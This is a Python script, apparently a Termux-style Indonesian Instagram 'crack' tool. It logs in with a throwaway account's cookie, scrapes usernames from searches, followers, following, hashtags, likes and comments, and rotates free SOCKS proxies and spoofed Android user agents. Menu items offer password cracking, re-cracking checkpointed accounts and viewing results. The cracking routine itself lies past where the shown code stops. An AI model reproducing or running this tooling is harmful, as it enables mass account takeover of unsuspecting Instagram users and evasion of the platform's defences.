# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import urllib.request
	import urllib.parse
	import base64,bs4
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
    import Cryptodome
except ImportError:
    os.system('clear')
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall Cryptodome\n")
    os.system("pip install pycryptodome");os.system("pip install pycryptodomex")
try:
    import nacl.public
except ImportError:
    os.system('clear')
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall PyNaCl\n")
    os.system("pkg install binutils -y");os.system("pip install PyNaCl")
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
import pytz
from bs4 import BeautifulSoup as par
from time import time as tim
from cleantext import clean
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time
from rich.progress import Progress,TextColumn
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from nacl.public import PublicKey, SealedBox
from Cryptodome import Random
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
color_table = "#afafff"
color_rich = "[#afafff]"
try:
	os.mkdir('result')
except:
	pass
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([Z2,H2,K2,B2,U2,N2,O2,P2,J2,A2])
hapus  = '[/]'

def proxies(sock=False):
    data=[]
    link='https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'
    sock='socks5' if sock is not False else 'socks4'
    resp=requests.get(link.format(sock),stream=True)
    for line in resp.iter_lines():data.append(line.decode())
    return data
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)"
#ua=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
method=[]
s=requests.Session()
zx=[]
s=requests.Session()
ncek=[]
til = "ncek"
############UA#############
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def banner():
	clear()
	au=f"""
[blue] 
\t\t██╗░██████╗░░█████╗░
\t\t██║██╔════╝░██╔══██╗
\t\t██║██║░░██╗░██║░░╚═
\t\t██║██║░░╚██╗██║░░██╗  AUTHOR:NCEK-XD
\t\t██║╚██████╔╝╚█████╔╝  VERSION:2.1.1
\t\t╚═╝░╚═════╝░░╚════╝░
[/blue]"""
	sol().print(nel(au,style='',title=f'{waktu()}'))
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Verifikasi Lisensi...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def li():
    clear()
    up=f"""[green]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                            [/green]"""
    ui=nel(up,style='green')
    sol().print(ui)	
def lu():
	clear()
	up=f"""[red]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                   [/red]
"""
	sol().print(nel(up, style=''))
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            cetak(nel('[bold cyan]Login menggunakan cookie instagram[/]'))
            coki = input(' [ig] Cookie anda : ')
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] cookie kamu valid", padding=(0,5), style="bold white", width=70));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(4)
                exit(f'{M} [x] Login gagal silahkan cek akun tumbal anda');time.sleep(8)
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:register_device()
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.socks4=proxies(False)
		self.socks5=proxies(True)
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			urut=[]
			urut.append(Panel(f"{bc}Nama     : {nama}		\n{bc}Username : {self.username} {hapus}		\nPengikut : {followers} 					\n{bc}{hapus}Mengikuti: {following}		",title=f'{merah}•{kuning}•{hijau}•{hijau} DATA AKUN {hijau}•{kuning}•{merah}•{hapus}',padding=(0,2), style="bold white"))
			Console(width=70,style="bold white").print(Columns(urut),justify="center")
			tap = me()
			tap.add_column('NO', style='blue', justify='center')
			tap.add_column('MENU', style='', justify='left', width=55)
			tap.add_column('STATUS', style='green', justify='right')
			tap.add_row('[01]','Crack Dari Pencarian Nama				 	','[ON]')
			tap.add_row('[02]','Crack Dari Pengikut				 	','[ON]')
			tap.add_row('[03]','Crack Dari Mengikuti',					'[ON]')
			tap.add_row('[04]','Crack Dari Hastag				 	','[ON]')
			tap.add_row('[05]','Crack Dari Like				 	','[ON]')
			tap.add_row('[06]','Crack Dari Komentar				 	','[ON]')
			tap.add_row('[07]','Crack Ulang Hasil [yellow]CP[/yellow]					','[ON]')
			tap.add_row('[08]','Lihat Hasil Crack					','[ON]')
			tap.add_row('[09]','Bot auto unfollow','[red][OFF][/red]')
			tap.add_row('[C]','Info update','[ON]')
			tap.add_row('[E]','[red]LOGOUT[/red]','[ON]')
			sol().print(tap, justify='left')
	def ChangeLog(self):
		io='[1] Crack dari hastag\n[2] crack dari like\n[3] crack dari komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))
		io='[1] Untuk fitur Bot unfollow masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()
	def Exit(self):
		kel='[?] Apakah anda yakin ingin keluar ?'
		kel1=nel(kel,style='red')
		sol().print(kel1)
		x=input(f'\n{N}[•] Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python run.py')
		elif x in ('t','T'):
			os.system('python run.py')
		else:
			self.Exit()
	def sixAPI(self,six_id):
		url = f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={six_id}&rrank_token=0.35875757839675004&include_reel=true"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid
	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=uuid.uuid4()
		xx=self.s.get(f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={uuid.uuid4()}').cookies['csrftoken']
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': xx})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			str(uuid.uuid4()),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
	def tag(self,tag):
		try:
			coki=open('.kukis.log','r').read()
			csrf= re.search(r'csrftoken=([^;]+)', coki).group(1)
			self.head.update({'X-csrftoken':csrf,'cookie':coki})
			self.head.update({'cookie':coki})
			url=f'https://www.instagram.com/api/v1/tags/web_info/?tag_name={tag}'
			link=self.s.get(url,headers=self.head).text
			cek=re.findall('"username":"(.*?)","full_name":"(.*?)",', link)
			for x in cek:
				username=x[0]
				fullname=x[1]
				internal.append(f'{username}|{fullname}')
				sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
				sys.stdout.flush()
				time.sleep(0.0002)
		except KeyboardInterrupt:
				pass
		except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username")
				self.passwordAPI(internal)
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)
		except Exception as e:exit((f"{N}[{M}×{N}] gagal mengambil username"))
		
		return internal
	def liker(self,mediaid):
		try:
			coki=open('.kukis.log','r').read()
			csrf= re.search(r'csrftoken=([^;]+)', coki).group(1)
			self.head.update({'X-csrftoken':csrf,'cookie':coki})
			url=f'https://www.instagram.com/api/v1/media/{mediaid}/likers/'
			link=self.s.get(url,headers=self.head)
			cari=json.loads(link.text)
			for x in cari['users']:
				username=x['username']
				fullname=x['full_name']
				internal.append(f'{username}|{fullname}')
				sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
				sys.stdout.flush()
				time.sleep(0.0002)
		except KeyboardInterrupt:
				pass
		except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username")
				self.passwordAPI(internal)
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)
		except Exception as e:exit((f"{N}[{M}×{N}] gagal mengambil username"))
		
		return internal
	
	def komen(self,mediaid):
		try:
			coki=open('.kukis.log','r').read()
			csrf= re.search(r'csrftoken=([^;]+)', coki).group(1)
			self.head.update({'X-csrftoken':csrf,'cookie':coki})
			url=f'https://www.instagram.com/api/v1/media/{mediaid}/info/'
			link=self.s.get(url,headers=self.head).text
			cek=re.findall('"username":"(.*?)","full_name":"(.*?)",', link)
			for x in cek:
				username=x[0]
				fullname=x[1]
				internal.append(f'{username}|{fullname}')
				sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
				sys.stdout.flush()
				time.sleep(0.0002)
		except KeyboardInterrupt:
				pass
		except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username")
				self.passwordAPI(internal)
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)
		except Exception as e:exit((f"{N}[{M}×{N}] gagal mengambil username"))
		
		return internal
	
	def mediaid(self,link):
		response = requests.get(link)
		if response.status_code == 200:
			soup = par(response.text, 'html.parser')
			meta_tags = soup.find_all('meta', {'property': 'al:ios:url'})
			for tag in meta_tags:
				content = tag.get('content')
				if content.startswith('instagram://media?id='):
					media_id = content[len('instagram://media?id='):]
					return media_id
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname search {H}{nama}{N}")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasala;h{C}')
		except (KeyError, UnboundLocalError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
		except KeyboardInterrupt:
				pass
		return internal
	
	def convert(self, nama):
		with requests.Session() as jembut:
			for i in nama.split(','):
				curl = jembut.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(i), headers = {"user-agent":USN}, cookies =self.cookie).json()
				data = curl["data"]["user"]
				return data["id"]

	def followers(self, userid, cokz):
		with requests.Session() as kontol:
			try:
				link = kontol.get(f"https://i.instagram.com/api/v1/friendships/{userid}/followers/?count=100&max_id={cokz}", headers = {"user-agent":USN}, cookies =self.cookie)
				for x in json.loads(link.text)["users"]:
					if x["username"] in internal:
						continue
					internal.append(x["username"]+"|"+x["full_name"])
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
					sys.stdout.flush()
					time.sleep(0.0002)
				if "next_max_id" in json.loads(link.text):self.followers(userid, json.loads(link.text)["next_max_id"])
				self.passwordAPI(internal)
			except KeyboardInterrupt:
				pass
			except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
				self.passwordAPI(internal)
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)

	def following(self, userid, cokz):
		with requests.Session() as kontol:
			try:
				link = kontol.get(f"https://i.instagram.com/api/v1/friendships/{userid}/following/?count=100&max_id={cokz}", headers = {"user-agent":USN}, cookies =self.cookie)
				for x in json.loads(link.text)["users"]:
					if x["username"] in internal:
						continue
					internal.append(x["username"]+"|"+x["full_name"])
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
					sys.stdout.flush()
					time.sleep(0.0002)
				if "next_max_id" in json.loads(link.text):self.following(userid, json.loads(link.text)["next_max_id"])
				self.passwordAPI(internal)
			except KeyboardInterrupt:
				pass
			except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
				self.passwordAPI(internal)
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[!] Cookie checkpoint{N}")
			except Exception as e:
				exit(f"{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:register_device()
	def uaper(self):
		try:
			html=requests.get("https://apkcombo.com/id/instagram/com.instagram.android/download/apk")
			soup=par(html.content,"html.parser")
			name=str(soup.find("span",class_="vername").text).split(" ")[1]
			code=str(soup.find("span",class_="vercode").text).replace("(","").replace(")","")
			name=name
			code=code
		except:
			name="275.0.0.27.98"
			code="458229219"
		return name,code
	
	def ua_infinix(self):
		versi=self.vers()
		dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
		browser_version = random.choice(['113.0.5672.132', '113.0.5672.131', '113.0.5672.77', '113.0.5672.76', '112.0.5615.136', '112.0.5615.135', '112.0.5615.101', '112.0.5615.100', '112.0.5615.48', '112.0.5615.47', '111.0.5563.116', '111.0.5563.115', '111.0.5563.58', '111.0.5563.57', '111.0.5563.49', '111.0.5563.48', '110.0.5481.154', '110.0.5481.153', '110.0.5481.65', '110.0.5481.64', '110.0.5481.63', '110.0.5481.61', '109.0.5414.118', '109.0.5414.117', '109.0.5414.86', '109.0.5414.85', '108.0.5359.128', '108.0.5359.79', '108.0.5359.61', '107.0.5304.141', '107.0.5304.105', '107.0.5304.91', '107.0.5304.54', '106.0.5249.126', '106.0.5249.118', '106.0.5249.79', '106.0.5249.65', '105.0.5195.136', '105.0.5195.124', '105.0.5195.79', '105.0.5195.77', '105.0.5195.68', '104.0.5112.97', '104.0.5112.69', '103.0.5060.129', '103.0.5060.71', '103.0.5060.70', '103.0.5060.53', '102.0.5005.125', '102.0.5005.99', '102.0.5005.98', '102.0.5005.78', '102.0.5005.59', '102.0.5005.58', '101.0.4951.74', '101.0.4951.61', '101.0.4951.41', '101.0.4951.15 ', '100.0.4896.127', '100.0.4896.88'])
		android_version = random.choice(['12', '11', '9'])
		device_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
		useragent = ('Instagram {} Android ({}/{}; {}; INFINIX MOBILITY LIMITED/Infinix; {}; marlin; qcom; in_ID)'.format(versi,self.Android_Version(android_version), android_version, dpi_pixel, device_model))
		return useragent		
	def timezone(self,lang):
		if lang in('in_ID','in-ID'):zone='Asia/Jakarta'
		else:zone='America/New_York'    
		tz=pytz.timezone(zone)
		return str(datetime.now(tz).utcoffset())
	def Android_Version(self,android_version):
		if str(android_version)=='9':
			return('28')
		elif str(android_version)=='10':
			return('29')
		elif str(android_version)=='11':
			return('30')
		elif str(android_version)=='12':
			return('31')
		else:
			return('32')
	def ua_ran(self):
		rr=random.randint;rc = random.choice;dpis = random.choice(["240dpi", "480dpi", "320dpi", "440dpi", "640dpi","133dpi","320dpi","515dpi","160dpi","640dpi","240dpi","120dpi","800dpi","480dpi","225dpi","768dpi","216dpi","1024dpi","213dpi","450dpi"]);basa =rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT','es_ES']);pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368","1080x2177","1080x2132","720x1449","1080x2110","1080x2263","1080x2134","1080x2176"]);akhir = rr(399993134,444761830);com=rc(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"]);ver = rr(18,25);si = rr(72,120);versi=self.vers();andro=rc([f"30/{rr(4,23)}",f"31/{rr(4,13)}",f"29/{rr(4,13)}","33/13"]);xiaomi=rc(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G','2201117SG','M2010J19SL','M2006C3MG','2201117TY','M2003J15SC','2201117SY','23021RAAEG','M2101K7BI'])
